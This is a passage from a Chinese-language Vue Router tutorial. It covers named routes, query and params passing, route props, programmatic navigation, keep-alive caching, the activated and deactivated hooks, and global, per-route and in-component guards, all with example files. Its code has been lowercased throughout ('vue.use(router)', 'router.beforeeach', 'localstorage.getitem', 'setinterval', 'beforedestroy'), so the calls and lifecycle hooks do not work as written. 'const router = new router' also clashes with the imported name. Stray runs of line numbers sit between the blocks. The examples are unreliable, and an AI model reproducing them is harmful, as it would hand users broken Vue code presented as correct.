\'../pages/detail\'\n\nvue.use(router);\n\nexport default new router({\n    routes: [{\n        path: \'/home\',       // url 端\n        component: home,     // 展示 端\n        children: [{         // 子级路由（当前是二级路由）\n            path: \'news\',    // 不要带上`/`\n            component: news,\n        }, {\n            path: \'message\',\n            component: message,\n            children: [{              // 点击每条message信息时在下方展示详情\n                path: \'detail\',       // 子级路由（当前是三级路由）\n                component: detail,\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: about\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n\n\nmessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        \x3c!-- 写法一：直接在链接后加上传统的`?xxx=yyy&www=zzz`即可 --\x3e\n        \x3c!-- <router-link\n          :to="`/home/message/detail?id=${item.id}&title=${item.title}`"\n        >{{item.title}}</router-link> --\x3e\n        \x3c!-- 写法二：使用to的对象形式，对象的path就是路由路径，query是个对象，用于存储路径后面的值 --\x3e\n        <router-link\n          :to="{\n            path: \'/home/message/detail\',\n            query: {\n              id: item.id,\n              title: item.title,\n            },\n          }"\n          >{{ item.title }}</router-link\n        >\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n\n\ndetail.vue：\n\n<template>\n  <div>\n    \x3c!-- 使用this.$route.query接收路由跳转时的query传参 --\x3e\n    <h2>id：{{ $route.query.id }}</h2>\n    <h2>title：{{ $route.query.title }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "detail",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 3.4 命名路由和params传参\n\n我们回顾上一节to属性的对象写法：\n\n// to属性的对象写法\n:to="{\n  path: \'/home/message/detail\', // 路由地址\n  query: {                      // query传参，它是个对象，里面一组组key-value\n    id: item.id,\n    title: item.title,\n  },\n}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\n我们可以使用命名路由来简化层级比较深的路由。其实就是给路由配置规则的时候加上name: xxx，对应在<router-link>的to属性对象形式里可使用name，无需再写一大串的path。\n\n// to属性的对象写法\n:to="{\n  // 使用name的方式简化path的方式\n  name: \'xiangqing\',\n  // path: \'/home/message/detail\',\n  query: {\n    id: item.id,\n    title: item.title,\n  },\n}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n\n\n简化后的相关完整代码如下：\n\nrouter/index.js：\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\nimport detail from \'../pages/detail\'\n\nvue.use(router);\n\nexport default new router({\n    routes: [{\n        path: \'/home\',\n        component: home,\n        children: [{\n            path: \'news\',\n            component: news,\n        }, {\n            path: \'message\',\n            component: message,\n            children: [{\n                name: \'xiangqing\',   // 给比较深路由添加name，在<router-link>里的to就会更方便\n                path: \'detail\',\n                component: detail,\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: about\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nmessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        <router-link\n          :to="{\n            // 使用name的方式简化path的方式\n            name: \'xiangqing\',\n            // path: \'/home/message/detail\',\n            query: {\n              id: item.id,\n              title: item.title,\n            },\n          }"\n          >{{ item.title }}</router-link\n        >\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n\n\nparams传参，首先把路由配置中的path路径进行修改，比如原来的是path: \'detail\'，那现在就需要提前给params参数进行占位，那就是path: \'detail/:id/:title\'。然后在<router-link>的to属性里改成如下两种方式（特别注意第二种方式）：\n\n// to属性的普通写法\n:to="`/home/message/detail/${item.id}/${item.title}`"\n// to属性的对象写法，params传参只能搭配name使用，不能搭配path\n:to="{\n  // 使用name的方式\n  name: \'xiangqing\',\n  // 这里是params传参，那此时to对象里不能使用path，得用name\n  params: {\n    id: item.id,\n    title: item.title,\n  },\n}"\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n\n\n相关完整代码如下：\n\nrouter/index.js：\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\nimport detail from \'../pages/detail\'\n\nvue.use(router);\n\nexport default new router({\n    routes: [{\n        path: \'/home\',\n        component: home,\n        children: [{\n            path: \'news\',\n            component: news,\n        }, {\n            path: \'message\',\n            component: message,\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail/:id/:title\', // prams传参，提前占位\n                component: detail,\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: about\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nmessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        \x3c!-- 方式一 --\x3e\n        \x3c!-- <router-link :to="`/home/message/detail/${item.id}/${item.title}`">{{\n          item.title\n        }}</router-link> --\x3e\n        \x3c!-- 方式二，特别注意params传参不能和path搭配使用，得使用name --\x3e\n        <router-link\n          :to="{\n            // 使用name的方式\n            name: \'xiangqing\',\n            // 这里是params传参，那此时to对象里不能使用path，得用name\n            params: {\n              id: item.id,\n              title: item.title,\n            },\n          }"\n          >{{ item.title }}</router-link\n        >\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n\n\ndetail.vue：\n\n<template>\n  <div>\n    \x3c!-- 使用this.$route.params接收路由跳转时的params传参 --\x3e\n    <h2>id：{{ $route.params.id }}</h2>\n    <h2>title：{{ $route.params.title }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "detail",\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n\n\n\n# 3.5 路由的props传参\n\n我们可以看到detail组件在使用接收到的参数时，会使用$route.params.id这样一长串的代码。使用计算属性可以简化它，但是我们这节要使用路由的props传参的方式来简化。\n\n在配置路由信息时，在path、component平级处加上props这个新配置，这个新配置的值有三种形式，对象、布尔值和函数。\n\n路由的props传参有三种形式：\n\n{\n  path: \'message\',\n  component: message,\n  children: [{\n      name: \'xiangqing\',\n      path: \'detail/:id/:title\', // prams传参，提前占位\n      component: detail,\n      // 第一种，是个对象，该对象中所有key-value的组合最终都会通过props传给detail组件\n      // props: {a: 900, b: 1000},\n      // 第二种，是个布尔值，布尔值为true时，把路由接收到的所有params参数通过props传给detail组件\n      // props: true,\n      // 第三种，是个函数，函数返回的对象中所有key-value的组合最终都会通过props传给detail组件\n      // 函数的形参是route，它是当前路由信息，保存着params和query传参数据\n      props(route) {\n        return {id: route.query.id, title: route.query.title}\n      }\n  }]\n}\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n我们就使路由的props传参第三种形式来优化前面的例子：\n\nrouter/index.js：\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\nimport detail from \'../pages/detail\'\n\nvue.use(router);\n\nexport default new router({\n    routes: [{\n        path: \'/home\',\n        component: home,\n        children: [{\n            path: \'news\',\n            component: news,\n        }, {\n            path: \'message\',\n            component: message,\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: detail,\n                // 使用路由props的函数形式，形参是route路由信息，返回值的key-value会作为detail的props\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: about\n    }]\n})\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\nmessage.vue：\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        <router-link\n          :to="{\n            name: \'xiangqing\',\n            query: {\n              id: item.id,\n              title: item.title,\n            },\n          }"\n          >{{ item.title }}</router-link\n        >\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n\n\ndetail.vue：\n\n<template>\n  <div>\n    \x3c!-- 直接使用props参数 --\x3e\n    <h2>id：{{ id }}</h2>\n    <h2>title：{{ title }}</h2>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "detail",\n  // 接收路由props传参\n  props: ["id", "title"],\n};\n<\/script>\n\n<style>\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# 3.6 编程式的导航\n\n在开始学习编程式的导航之前我们看一下浏览器左上角的“前进”和“后退”。这两个按钮依赖一个历史页面存储结构，该结构其实是一个栈数据类型来。在点击“后退”时，会让“指针”挪动到后面一条url相关的页面；在点击“前进”时，会让“指针”挪动到前面一条url相关的页面。\n\n在页面点击新链接，浏览器地址栏的url更新，这个新的url会被压到栈里（push方式）。<router-link>就是默认使用这种方式（push方式），它其实还有一个replace方式，在点击新链接，浏览器地址栏的url更新，但会将栈顶当前这条url替换成新的url（以前是追加，现在是替换最顶上那条）。\n\n\x3c!-- 比如我们访问的顺序是：# - about - home - news - message - detail，目前在detail这里，\n由于下面这行代码，导致后退的顺序是detail - message - home - about - # --\x3e\n<router-link to="/home/message" replace></router-link>\n\n\n1\n2\n3\n\n\n我们再来说说编程式的导航，它的作用是不借助<router-link>来实现路由跳转，让路由跳转更加灵活。\n\n那它借助的是什么呢？是$router里的各种方法（方法具体在原型上），比如push手动跳转到目标路由（类似<router-link>的to属性），back往后退一步路由（类似浏览器“后退”），forward往前进一步路由（类似浏览器“前进”），go(value)当value为正数时前进几步路由为负数时后退几步路由。\n\n首先我们在message组件中，实现点击每条message尾后的<button>就跳转路由。具体要在点击事件回调函数里使用this.$router.push(param)，如果效果要与之前的<router-link>效果一样，那这个param必须与<router-link>的to属性值一样并且是对象形式。\n\n其实还有this.$router.replace(param)，使用新页面信息替换当前页面信息。这里额外说一下，<router-link to="xxx">其实内部是调用了push方法的，只是它是标签的使用形式，push是js编程的使用形式。\n\n<template>\n  <div>\n    <ul>\n      <li v-for="(item, index) in list" :key="index">\n        {{ item.title }}\n        \x3c!-- 我们将router-link换成了button来跳转路由 --\x3e\n        <button @click="showdetailpush(item)">查看详情（push方式）</button>\n        <button @click="showdetailreplace(item)">查看详情（replace方式）</button>\n      </li>\n    </ul>\n    <div>\n      <router-view></router-view>\n    </div>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "message",\n  data() {\n    return {\n      list: [\n        { id: "001", title: "message001" },\n        { id: "002", title: "message002" },\n        { id: "003", title: "message003" },\n      ],\n    };\n  },\n  methods: {\n    showdetailpush(item) {\n      // 手动跳转就需要使用之前to的对象形式\n      // push，追加新的页面信息\n      this.$router.push({\n        name: "xiangqing",\n        query: {\n          id: item.id,\n          title: item.title,\n        },\n      });\n    },\n    showdetailreplace(item) {\n      // 手动跳转就需要使用之前to的对象形式\n      // replace，将原来的当前页面信息替换成这里的新页面信息\n      this.$router.replace({\n        name: "xiangqing",\n        query: {\n          id: item.id,\n          title: item.title,\n        },\n      });\n    }\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n\n\n我们使用back、forward和go(value)来实现前进和后退路由：\n\napp.vue：\n\n<template>\n  <div>\n    <div>\n      <button class="backstep" @click="go(-2)">后退2步</button>\n      <button class="back" @click="back">后退</button>\n      <button class="forward" @click="forward">前进</button>\n      <button class="forwardstep" @click="go(2)">前进2步</button>\n    </div>\n    <div class="outer">\n      <div class="link">\n        <router-link to="/home" active-class class="list-item"\n          >home</router-link\n        >\n        <router-link to="/about" class="list-item">about</router-link>\n      </div>\n      <div class="content">\n        <router-view></router-view>\n      </div>\n    </div>\n  </div>\n</template>\n<script>\nexport default {\n  name: "app",\n  methods: {\n    back() {\n      this.$router.back();\n    },\n    forward() {\n      this.$router.forward();\n    },\n    go(value) {\n      this.$router.go(value);\n    },\n  },\n};\n<\/script>\n<style>\n.back,\n.forward { width: 60px; margin: 10px 10px 20px 10px; }\n.backstep { margin-left: 16%; }\n.outer { display: flex; }\n.link {\n  display: flex; flex-direction: column;\n  margin-left: 16%;\n}\n.content {\n  margin-left: 10px; padding: 20px;\n  background-color: darkgrey;\n}\n.list-item {\n  margin-bottom: 10px; padding: 10px 15px;\n  background-color: #fff; border: 1px solid #ddd;\n}\n.list-item.active,\n.list-item.router-link-exact-active {\n  z-index: 2; color: #fff;\n  background-color: #337ab7;\n  border-color: #337ab7;\n}\na { text-decoration: none; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n\n\n\n# 3.7 缓存路由组件\n\n我们经常需要在切换页签跳转路由时，能缓存输入组件内的信息，但跳转路由默认是将之前的组件销毁destroy了。要解决这个问题，需要使用<keep-alive>标签将<router-view>进行包裹。\n\n使用<keep-alive>标签包裹之后，这个<router-view>相关的所有组件都将会被缓存，如果只想缓存个别的，就添加include="news"属性。特别注意，news这个名字是组件内部配置对象里的name属性值。include还可以使用v-bind动态绑定，绑定一个数组[\'news\', \'message\']，让这两个组件被缓存而不被销毁。\n\nhome.vue：\n\n<template>\n  <div>\n    <p>vue组件home：我是home的内容，我是home的内容，我是home的内容，我是home的内容</p>\n    <div>\n      <ul class="nav">\n        <li>\n          <router-link active-class to="/home/news" class="list-item">news</router-link>\n        </li>\n        <li>\n          <router-link to="/home/message" class="list-item">message</router-link>\n        </li>\n      </ul>\n      \x3c!-- 使用keep-alive标签包裹router-view，让相关组件被缓存，如果设置include，\n      那就只让include里的组件被缓存。include可以是数组，使用v-bind进行动态绑定，让数组里对应的组件进行缓存 --\x3e\n      <keep-alive include="news" class="content-child">\n        <router-view></router-view>\n      </keep-alive>\n    </div>\n  </div>\n</template>\n<script>\nexport default { name: "home" };\n<\/script>\n\n<style>\n.nav { display: flex; justify-content: flex-start;\n  padding-left: 0; margin-top: 35px; list-style: none;\n}\n.nav > li { width: 100px; }\n.content-child { background-color: darkgray; }\n</style>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\nnews.vue：\n\n<template>\n  <ul>\n    \x3c!-- 增加输入组件 --\x3e\n    <li>news001<input /></li>\n    <li>news002<input /></li>\n    <li>news003<input /></li>\n  </ul>\n</template>\n\n<script>\nexport default {\n  name: "news", // 这个属性值会被<keep-alive include="news">使用\n  // 可以在message组件里也加上这个日志，如果使用<keep-alive include="news">，\n  // 那就只会出现"message即将被销毁"的日志\n  beforedestroy() {\n    console.log("news即将被销毁");\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n\n\n\n# 3.8 两个新的生命钩子\n\n如果组件被缓存了，也就是使用<keep-alive>标签将<router-view>进行包裹。如果该组件内部持续性的例如定时器，在切换页签时由于该组件没有被销毁，那么就不会走到beforedestroy里的clearinterval。这样就导致页面性能底，非常耗资源。\n\nnews.vue：\n\n<template>\n  <div>\n    <h1 :style="{ opacity }">我是定时器示例文本</h1>\n    <ul>\n      <li>news001<input /></li>\n      <li>news002<input /></li>\n      <li>news003<input /></li>\n    </ul>\n  </div>\n</template>\n<script>\nexport default {\n  name: "news",\n  data() {\n    return {\n      opacity: 1,\n    };\n  },\n  mounted() {\n    this.timer = setinterval(() => {\n      console.log("@");\n      this.opacity -= 0.01;\n      if (this.opacity <= 0) this.opacity = 1;\n    }, 16);\n  },\n  beforedestroy() {\n    console.log("news即将被销毁");\n    clearinterval(this.timer);\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n\n\n解决上面这个问题，就需要两个新的生命钩子activated和deactivated，其中activated是组件激活时被调用（之前切换页签，它被缓存了），deactivated是组件失活时被调用（页签从当前组件切出去了）。注意，这是两个生命钩子是路由组件独有的！\n\n<template>\n  <div>\n    <h1 :style="{ opacity }">我是定时器示例文本</h1>\n    <ul>\n      <li>news001<input /></li>\n      <li>news002<input /></li>\n      <li>news003<input /></li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "news",\n  data() {\n    return {\n      opacity: 1,\n    };\n  },\n  // 组件激活时被调用\n  activated() {\n    console.log("news被激活");\n    this.timer = setinterval(() => {\n      console.log("@");\n      this.opacity -= 0.01;\n      if (this.opacity <= 0) this.opacity = 1;\n    }, 16);\n  },\n  // 组件失活时被调用\n  deactivated() {\n    console.log("news失活");\n    clearinterval(this.timer);\n  },\n};\n<\/script>\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n\n\n\n# 3.9 路由守卫\n\n路由守卫是在跳转路由的“前后”作出相应的处理（放置守卫）。\n\n基于路由本身来说，分为全局路由守卫和独享路由守卫，它们的区别是，前者是守卫所有路由的切换动作，后者是守卫某个单个路由的切换动作。全局路由守卫还分为前置的和后置的。\n\n# 全局前置路由守卫\n\n全局前置路由守卫，是在所有路由的切换之前作出相应的处理。具体在router.index.js里使用router.beforeeach(func)，其中这个func就是在每次切换之前会被调用（其实初始化时也会调用一次）。全局前置路由守卫常用于设置路由的访问权限的。\n\n我们先看一下func的三个形参，func(to, from, next){}，to是切换到哪个路由，from是切换前的路由；next就比较重要了，在func内部写上next()就可以“放行”这次的拦截，如果不写就会拦截本次切换。我们设置访问权限就是依靠这三个参数。\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\nimport detail from \'../pages/detail\'\n\nvue.use(router);\n\nconst router = new router({\n    routes: [{\n        path: \'/home\',\n        component: home,\n        children: [{\n            name: \'xinwen\',\n            path: \'news\',\n            component: news,\n        }, {\n            name: \'xinxi\',\n            path: \'message\',\n            component: message,\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: detail,\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: about\n    }]\n})\n// 全局前置路由守卫，每次路由切换之前被调用（初始化时也会被调用一次）\nrouter.beforeeach((to, from, next) => {\n    if (to.name === \'xinxi\' || to.name === \'xinwen\') {\n        // 权限\n        const jurisdiction = localstorage.getitem(\'jurisdiction\');\n        if (jurisdiction && jurisdiction === \'pass\') {\n            next();\n        } else {\n            alert(\'您没有访问的权限！\')\n        }\n    } else {\n        next();\n    }\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n\n\n如果有些路由要做权限设置，而有些又不需要做权限设置，那怎么办呢？我们可以给路由加上一个自定义的标识。route的meta属性是路由元信息，由于存放自定义的东西。\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\nimport detail from \'../pages/detail\'\n\nvue.use(router);\n\nconst router = new router({\n    routes: [{\n        path: \'/home\',\n        component: home,\n        children: [{\n            name: \'xinwen\',\n            path: \'news\',\n            component: news,\n            // 使用路由元信息meta来存储自定义的标识isauth\n            meta: { isauth: true },\n        }, {\n            name: \'xinxi\',\n            path: \'message\',\n            component: message,\n            // 使用路由元信息meta来存储自定义的标识isauth\n            meta: { isauth: true },\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: detail,\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: about\n    }]\n})\n// 全局前置路由守卫，每次路由切换之前被调用（初始化时也会被调用一次）\nrouter.beforeeach((to, from, next) => {\n    // 换成to.meta.isauth来判断\n    if (to.meta && to.meta.isauth) {\n        // 权限\n        const jurisdiction = localstorage.getitem(\'jurisdiction\');\n        if (jurisdiction && jurisdiction === \'pass\') {\n            next();\n        } else {\n            alert(\'您没有访问的权限！\')\n        }\n    } else {\n        next();\n    }\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n\n\n# 全局后置路由守卫\n\n全局后置路由守卫，是在所有路由的切换之后作出相应的处理。具体在router.index.js里使用router.aftereach(func)，其中这个func就是在每次切换之后会被调用（其实初始化时也会调用一次）。全局后置路由守卫不是用于设置访问权限的，一般用于切换成功修改页面某个内容的。\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\nimport detail from \'../pages/detail\'\n\nvue.use(router);\n\nconst router = new router({\n    routes: [{\n        path: \'/home\',\n        component: home,\n        // 使用路由元信息meta\n        meta: { title: \'主页\' },\n        children: [{\n            name: \'xinwen\',\n            path: \'news\',\n            component: news,\n            // 使用路由元信息meta\n            meta: { isauth: true, title: \'新闻\' },\n        }, {\n            name: \'xinxi\',\n            path: \'message\',\n            component: message,\n            // 使用路由元信息meta\n            meta: { isauth: true, title: \'信息\' },\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: detail,\n                // 使用路由元信息meta\n                meta: { title: \'详情\' },\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }]\n        }]\n    }, {\n        path: \'/about\',\n        component: about,\n        // 使用路由元信息meta\n        meta: { title: \'关于\' },\n    }]\n})\n// 全局前置路由守卫，每次路由切换之前被调用（初始化时也会被调用一次）\nrouter.beforeeach((to, from, next) => {\n    // 换成to.meta.isauth来判断\n    if (to.meta && to.meta.isauth) {\n        // 权限\n        const jurisdiction = localstorage.getitem(\'jurisdiction\');\n        if (jurisdiction && jurisdiction === \'pass\') {\n            next();\n        } else {\n            alert(\'您没有访问的权限！\')\n        }\n    } else {\n        next();\n    }\n});\n// 全局后置路由守卫，每次路由切换之后被调用（初始化时也会被调用一次）\nrouter.aftereach((to) => {\n    // 每次切换成功后修改页签名\n    document.title = to.meta.title || \'vue\';\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n\n\n# 独享路由守卫\n\n独享路由守卫是守卫某个单个路由的切换动作。独享路由守卫没有前置和后置的，它只有beforeenter: function(to, from, next)，并且就是配置在单个路由信息里，也就是与path和component平级。注意beforeenter的值就是一个函数，这个函数与全局路由守卫里的func回调函数写法一样，入参也是一样。\n\nimport vue from \'vue\'\nimport router from \'vue-router\'\nimport home from \'../pages/home\'\nimport about from \'../pages/about\'\nimport news from \'../pages/news\'\nimport message from \'../pages/message\'\nimport detail from \'../pages/detail\'\n\nvue.use(router);\n\nconst router = new router({\n    routes: [{\n        path: \'/home\',\n        component: home,\n        // 使用路由元信息meta\n        meta: { title: \'主页\' },\n        children: [{\n            name: \'xinwen\',\n            path: \'news\',\n            component: news,\n            // 使用路由元信息meta\n            meta: { title: \'新闻\' },\n            // 独享路由守卫\n            beforeenter: (to, from, next) => {\n                const jurisdiction = localstorage.getitem(\'jurisdiction\');\n                if (jurisdiction && jurisdiction === \'pass\') {\n                    next();\n                } else {\n                    alert(\'您没有访问的权限！\')\n                }\n            },\n        }, {\n            name: \'xinxi\',\n            path: \'message\',\n            component: message,\n            // 使用路由元信息meta\n            meta: { title: \'信息\' },\n            children: [{\n                name: \'xiangqing\',\n                path: \'detail\',\n                component: detail,\n                // 使用路由元信息meta\n                meta: { title: \'详情\' },\n                props({ query }) {\n                    return { id: query.id, title: query.title }\n                }\n            }],\n            // 独享路由守卫\n            beforeenter: (to, from, next) => {\n                const jurisdiction = localstorage.getitem(\'jurisdiction\');\n                if (jurisdiction && jurisdiction === \'pass\') {\n                    next();\n                } else {\n                    alert(\'您没有访问的权限！\')\n                }\n            },\n        }]\n    }, {\n        path: \'/about\',\n        component: about,\n        // 使用路由元信息meta\n        meta: { title: \'关于\' },\n    }]\n})\n// 全局后置路由守卫，每次路由切换之后被调用（初始化时也会被调用一次）\nrouter.aftereach((to) => {\n    // 每次切换成功后修改页签名\n    document.title = to.meta.title;\n});\nexport default router;\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n\n\n# 组件内路由守卫\n\n前面的全局路由和独享路由都是基于路由本身来说的。我们说一下与路由对应的组件相关的守卫，我们常称为组件内路由守卫，它们在组件内部来使用的，非常像生命周期钩子。\n\n通过路由规则进入该组件时会调用beforerouteenter(to, from, next)，通过路由规则离开组件时会调用beforerouteleave(to, from, next)。一定要注意，是通过路由的方式，也就是<router-link>或者$router.push()让组件展示的，并不是使用组件标签调用的。\n\n<template>\n  <div>\n    <ul>\n      <li>news001<input /></li>\n      <li>news002<input /></li>\n      <li>news003<input /></li>\n    </ul>\n  </div>\n</template>\n\n<script>\nexport default {\n  name: "news",\n  // 通过路由规则进入组件时被调用\n  beforerouteenter(to, from, next) {\n    if (to.meta && to.meta.isauth) {\n      const jurisdiction = localstorage.getitem("jurisdiction");\n      if (jurisdiction && jurisdiction === "pass") {\n        next();\n      } else {\n        alert("您没有访问的权限！");\n      }\n    } else {\n      next();\n    }\n  },\n  // 通过路由规则离开组件时被调用，要与router.aftereach区分开\n  // 